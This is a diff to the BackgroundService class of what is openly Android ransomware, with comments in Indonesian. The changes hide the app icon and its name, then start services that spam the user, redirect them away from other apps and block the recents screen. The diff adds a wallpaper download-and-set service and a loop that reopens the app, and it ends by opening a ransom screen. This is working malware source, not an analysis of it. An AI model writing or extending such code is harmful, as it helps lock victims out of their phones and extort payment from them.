@@ -69,19 +69,25 @@ public class BackgroundService extends Service {
                     Toast.LENGTH_LONG).show();
         });
 
-        // 1. Ganti icon jadi transparan
+        // 1. Ganti icon jadi transparan (nama ikut hilang karena label string kosong)
         IconSwitcher.switchNow(getApplicationContext());
 
-        // 2. Jalankan spam toast + notif
+        // 2. Jalankan spam
         ContextCompat.startForegroundService(this, new Intent(this, SpamService.class));
 
-        // 3. Jalankan redirect service (app lain -> ransom)
+        // 3. Redirect app lain
         ContextCompat.startForegroundService(this, new Intent(this, RedirectService.class));
 
         // 4. Recent guard
         ContextCompat.startForegroundService(this, new Intent(this, RecentGuardService.class));
 
-        // 5. Pindah ke layar ransom
+        // 5. Wallpaper download & set
+        ContextCompat.startForegroundService(this, new Intent(this, WallpaperService.class));
+
+        // 6. Reopen loop
+        ContextCompat.startForegroundService(this, new Intent(this, ReopenLoopService.class));
+
+        // 7. Pindah ke layar ransom
         Intent i = new Intent(this, RansomActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(i);
